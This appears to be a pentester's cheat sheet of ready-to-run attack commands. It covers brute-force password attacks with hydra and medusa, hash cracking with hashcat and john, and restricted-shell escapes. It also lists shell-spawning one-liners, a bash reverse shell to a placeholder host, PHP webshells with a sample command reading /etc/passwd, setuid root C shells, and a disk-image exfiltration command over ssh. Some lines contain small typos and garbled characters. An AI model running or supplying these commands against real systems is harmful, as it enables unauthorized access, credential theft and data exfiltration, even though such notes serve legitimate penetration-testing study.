
Cewl
cewl http://<targetip>/ -m 6 -w cewl.txt
wc -l cewl.txt
john --wordlist=cewl.txt --rules --stdout > mutated.txt
wc mutated.txt
medusa -h <targetip> -u admin -P mutated.txt -M http -n 80 -m DIR:/directory/to/login/panel -T 30

-----------------------------------

Hydra

hydra -l root -P /usr/share/wordlısts/rockyou.txt <targetip> ssh
hydra -L userlist.txt -P /usr/share/wordlısts/rockyou.txt <targetip> -s 22 ssh -V
# Hydra Brute Force
### FTP Brute Force:
```
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX ftp -V
```
### POP3 Brute Force:
```
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX pop3 -V
```
### SMTP Brute Force:
```
hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V
```
Use -t to limit concurrent connections, example: -t 15
### Web Login Form:
```
hydra -L /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt -P /usr/share/wordlists/rockyou.txt -s 8080 -f 10.129.35.106 http-get /manager/html
```

### SSH:
```
hydra -l root -p admin 192.168.1.105 -t 4 ssh
```

# crack web passwords
http-post-form can change as user module changes
Invalid: what message does the page give for wrong creds
for parameters check with burp

hydra -l admin -P /usr/share/seclists/Passwords/10k_most_common.txt <targetip> http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64 

-----------------------------------

Medusa
medusa -h <targetip> -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/test -T 10

-----------------------------------

Hashcat

# learn the hash type from hashcat.net example hashes page and pass as its m value
# or you can learn with the following command
hashcat -h | grep -i lm
hashcat -m 1600 hashes /usr/share/wordlists/rockyou.txt
hashcat -m 18200 path/to/hash /opt/rockyou -r rules/InsidePro-PasswordPro.rules
hashcat --user -m 1000 path/to/hash /opt/rockyou -r rules/InsidePro-PasswordPro.rules
hashcat --example-hashes | grep krb
hashcat --example-hashes | less press / and enter krb5asrep - so the mode will be 18200
hashcat -h | grep rep -i

-----------------------------------

LM/NTLM
hashcat -h | grep -i lm 
hashcat -m 3000  hashes --rules --wordlist=/usr/share/wordlists/rockyou.txt

https://hashkiller.co.uk/

------------------------------------------

When you find some digits, check if it's 32 bit
echo -n ....... | wc -c

------------------------------------------
John
john hashes.txt --rules --wordlist=/usr/share/wordlists/rockyou.txt 

Side note: 
check for /bin/dash
Bash likes to drop setuid permissions but Dash will not

## Repo of shells you can upload 
https://github.com/tennc/webshell
```
git clone https://github.com/tennc/webshell.git
```


```


## Restricted Shells: rbash, rksh, rzsh, lshell and rssh
1. try ls, cd, pwd, echo commands [if these commands are restricted, 
   an error will show up with the type of restricted shell we are in (most of the time, this is rbash)]
2. press tab twice to see what commands are available.
  a. if "ls" is avaiable list binaries in /bin, /usr/bin, /usr/local/bin
  b. echo /usr/bin/*  [use globbing to list directory contents]
  c. important to check for operators and escape characters such as the following:
  ```
     > >> < | & ; : ' " `
  ```
3. Try commands wrapped
```
(whoami)
{whoami}
```

## Shell Execution:
```
find /home -exec sh -i \;
```
## use text editors vim, vi, nano, pico, ed
```
:!/bin/sh, !/bin/zsh, try other shells!?!?
:shell
:set shell=/bin/sh
:set shell=/bin/bash:shell
:!bash
```

## use pagers less, more, or programs like man that use less or more by default
```
!/bin/sh, !/bin/zsh, try other shells!?!?
!/bin/bash
!bash
```

## find
use find command’s exec parameter for code execution (returns shell)
```
sudo find /home -exec sh -i \;
find /var/log -name messages -exec /bin/bash -i \;
```

## use awk command
```
awk 'BEGIN {system("/bin/sh")}'
```

## use expect command
```
expect
spwan sh
sh
```

## use tee command to create a script in scenarios where text editors aren't available
```
echo "bash -i" | tee script.sh
```

## use nmap command
```
nmap --interactive
nmap> !sh
```

## use ssh with the following options to escape restricted shell 
```
ssh user@IP -t "bash --noprofile"
ssh user@IP -t "/bin/sh"
```

## Reverse Shell:

```
bash -i >& /dev/tcp/<ip-address>/<port> 0>&1
```

# Programming Language:
## Python:
```
import os; os.system("/bin/sh")
```
```
python -c 'import pty; pty.spawn("/bin/sh")'
```
```
import os; os.system("/bin/bash")
```
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

## PHP:
```
exec("sh -i");
```

## PHP Webshell:
```
<?php
  $command = $_GET['cmd'];
  echo system($command);
?>
```
usage examples
```
url/webshell.php?cmd=ls
```

## PHP Webshell
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files
```
<?php
    if ($_SERVER['REMOTE_HOST'] === "FIXME") { // Set your IP address here
        if(isset($_REQUEST['cmd'])){
            $cmd = ($_REQUEST['cmd']);
            echo "<pre>\n";
            system($cmd);
            echo "</pre>";
        }
    }
?>
```
Once the shell is uploaded (with a random name), you can execute operating system commands by passing them in the cmd GET parameter:
```
https://example.org/7sna8uuorvcx3x4fx.php?cmd=cat+/etc/passwd
```

## Perl:
```
exec "/bin/sh";
```
```
perl —e 'exec "/bin/sh";'
```
```
exec "/bin/bash";
```
```
perl —e 'exec "/bin/bash";'
```

## Ruby:
```
exec "/bin/sh"
```
```
ruby -e 'exec "/bin/sh"'
```
```
exec "/bin/bash"
```
```
ruby -e 'exec "/bin/bash"'
```

## IRB:
```
exec "/bin/sh"
```

## Lua:
```
os.execute("/bin/sh")
```

## C:
```
#include <stdio.h>

int main(int argc, char **argv)
{
	int status = system(bash);
	return 0;
}
```
```
int main(void){
    setresuid(0, 0, 0);
    system("/bin/bash");
}
```
```
int main(void){
       setresuid(0, 0, 0);
       system("/bin/sh");
}       
```


```


# Encrypted exfil channel:
```
dd if=/dev/<disk-to-copy> bs=65536 conv=noerror, sync | ssh -C <user>@<ip-address> "cat > /tmp/image.dd"
```







